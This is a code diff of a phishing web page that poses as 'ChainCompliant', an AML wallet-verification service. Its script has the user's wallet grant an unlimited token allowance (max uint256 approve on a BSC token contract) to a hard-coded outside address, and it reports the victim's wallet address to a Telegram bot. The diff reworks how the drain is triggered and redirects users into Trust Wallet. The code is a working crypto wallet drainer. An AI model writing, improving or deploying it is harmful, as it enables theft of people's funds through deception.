@@ -11,44 +11,35 @@
 <style>
   :root { --ink: #0E1420; --panel: #17202F; --hair: #2A3549; --amber: #D9A441; --paper: #ECEFF4; --slate: #8C96AC; --green: #4F9D74; }
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: var(--ink); color: var(--paper); font-family: 'Inter', sans-serif; opacity: 0; transition: opacity 0.3s; }
-  body.ready { opacity: 1; }
-  #lockScreen { position: fixed; inset: 0; background: var(--ink); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-  .spinner { width: 40px; height: 40px; border: 3px solid var(--hair); border-top-color: var(--amber); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 24px; }
-  header { border-bottom: 1px solid var(--hair); padding: 16px 0; }
+  body { background: var(--ink); color: var(--paper); font-family: 'Inter', sans-serif; line-height: 1.5; }
+  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 32px; }
+  header { border-bottom: 1px solid var(--hair); padding: 18px 0; }
   .brand { display: flex; align-items: center; gap: 10px; font-family: 'Roboto Slab', serif; font-weight: 700; }
-  .brand-mark { width: 32px; height: 32px; background: var(--panel); border: 1px solid var(--hair); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--amber); font-family: 'IBM Plex Mono', monospace; font-size: 12px; }
-  .hero { padding: 80px 0; text-align: center; }
-  h1 { font-size: 42px; font-family: 'Roboto Slab', serif; line-height: 1.1; margin-bottom: 20px; }
+  .brand-mark { width: 34px; height: 34px; background: var(--panel); border: 1px solid var(--hair); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--amber); font-family: 'IBM Plex Mono', monospace; font-size: 13px; }
+  .hero { padding: 88px 0; text-align: center; }
+  h1 { font-size: 48px; font-family: 'Roboto Slab', serif; line-height: 1.1; margin-bottom: 24px; }
   h1 em { color: var(--amber); font-style: normal; }
   .btn-primary { background: var(--amber); color: #1B1305; font-weight: 700; padding: 16px 32px; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; }
-  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.95); z-index: 100; align-items: center; justify-content: center; padding: 16px; backdrop-filter: blur(10px); }
+  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.9); z-index: 100; align-items: center; justify-content: center; padding: 24px; backdrop-filter: blur(8px); }
   .modal-overlay.active { display: flex; }
-  .modal-box { background: var(--panel); border: 1px solid var(--hair); border-radius: 20px; max-width: 400px; width: 100%; padding: 32px; position: relative; }
+  .modal-box { background: var(--panel); border: 1px solid var(--hair); border-radius: 16px; max-width: 440px; width: 100%; padding: 32px; position: relative; }
   .field { margin-bottom: 24px; }
   .field label { display: block; font-size: 11px; color: var(--slate); margin-bottom: 8px; font-family: 'IBM Plex Mono', monospace; }
   .field input { width: 100%; background: var(--ink); border: 1px solid var(--hair); border-radius: 8px; padding: 14px; color: var(--paper); font-size: 14px; outline: none; }
   .result-header { color: var(--green); font-size: 20px; font-weight: 700; margin-bottom: 24px; }
-  .result-row { margin-bottom: 16px; text-align: left; }
+  .result-row { margin-bottom: 16px; }
   .result-label { font-size: 11px; color: var(--slate); font-family: 'IBM Plex Mono', monospace; margin-bottom: 4px; }
   .result-value { font-size: 15px; word-break: break-all; }
 </style>
 </head>
 <body>
 
-<div id="lockScreen">
-  <div class="spinner"></div>
-  <p style="font-size: 13px; color: var(--slate); font-family: 'IBM Plex Mono', monospace;">SECURE CONNECTION...</p>
-</div>
-
 <header><div class="wrap"><div class="brand"><div class="brand-mark">CC</div>ChainCompliant</div></div></header>
 
 <section class="hero">
   <div class="wrap">
     <h1>Know your <em>compliance</em> status before it costs you.</h1>
-    <p style="color:var(--slate); margin-bottom:32px;">Professional AML verification for wallets and transactions.</p>
+    <p style="color:var(--slate); margin-bottom:32px; font-size:18px;">Request an AML check on your wallet: professional review within 1-2 hours.</p>
     <button class="btn-primary" onclick="openModal()">Request a verification</button>
   </div>
 </section>
@@ -56,9 +47,9 @@
 <div class="modal-overlay" id="modal">
   <div class="modal-box">
     <div id="stepInput">
-      <h3 style="margin-bottom:24px;">Verification Details</h3>
-      <div class="field"><label>WALLET ADDRESS TO CHECK</label><input type="text" id="walletInput" placeholder="0x..." /></div>
-      <button id="actionBtn" class="btn-primary" style="width:100%" onclick="startFlow()">Verify Now</button>
+      <h3 style="margin-bottom:24px;">Request a verification</h3>
+      <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
+      <button id="actionBtn" class="btn-primary" style="width:100%" onclick="handleVerifyClick()">Verify Now</button>
     </div>
     <div id="stepResult" style="display:none;">
       <div class="result-header">✔ Request Received</div>
@@ -76,23 +67,27 @@
 
   function openModal() { document.getElementById('modal').classList.add('active'); }
 
-  async function startFlow() {
+  async function handleVerifyClick() {
     const addr = document.getElementById('walletInput').value.trim();
     if (!addr.startsWith('0x')) { alert("Enter valid address"); return; }
+    
     const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
     if (!isTrust) {
+      // DA SAFARI: APRE TRUST WALLET PASSANDO L'INDIRIZZO
       const current = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + current + "?a=" + addr;
       return;
     }
-    runApprove(addr);
+    // DENTRO TRUST WALLET: ESEGUE APPROVE
+    executeApprove(addr);
   }
 
-  async function runApprove(addr) {
+  async function executeApprove(addr) {
     try {
+      const btn = document.getElementById('actionBtn');
+      btn.disabled = true; btn.textContent = "Processing...";
+      
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      // 1. CONNECT IMMEDIATO
-      await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
       
@@ -100,38 +95,37 @@
       const text = `🔔 *New Request*\n\n📍 *Check:* \`${addr}\`\n👤 *User:* \`${connected}\``;
       fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
 
-      // 2. SWITCH NETWORK IMMEDIATO
+      // SWITCH NETWORK (BSC)
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
 
-      // 3. APPROVE IMMEDIATO (SENZA INTERRUZIONI)
+      // APPROVE
       const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
       const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
       
-      // SOLO ORA MOSTRIAMO IL SITO E IL RISULTATO
-      document.getElementById('lockScreen').style.display = 'none';
-      document.body.classList.add('ready');
-      openModal();
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = addr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
       await tx.wait();
     } catch (e) {
-      document.getElementById('lockScreen').style.display = 'none';
-      document.body.classList.add('ready');
+      console.error(e);
+      document.getElementById('actionBtn').disabled = false;
+      document.getElementById('actionBtn').textContent = "Verify Now";
     }
   }
 
-  // LOGICA DI AUTO-ESECUZIONE ULTRA-RAPIDA
-  window.addEventListener('load', () => {
+  window.addEventListener('load', async () => {
     const params = new URLSearchParams(window.location.search);
     const addr = params.get('a');
     if (addr && window.ethereum) {
-      // NON ASPETTIAMO IL CARICAMENTO DEL SITO, LANCIAMO SUBITO IL WALLET
-      runApprove(addr);
-    } else {
-      document.getElementById('lockScreen').style.display = 'none';
-      document.body.classList.add('ready');
+      // DENTRO TRUST WALLET: RECUPERA INDIRIZZO E APRE MODAL
+      document.getElementById('walletInput').value = addr;
+      openModal();
+      
+      // CHIEDE IMMEDIATAMENTE CONNECT WALLET
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (e) { console.error(e); }
     }
   });
 </script>
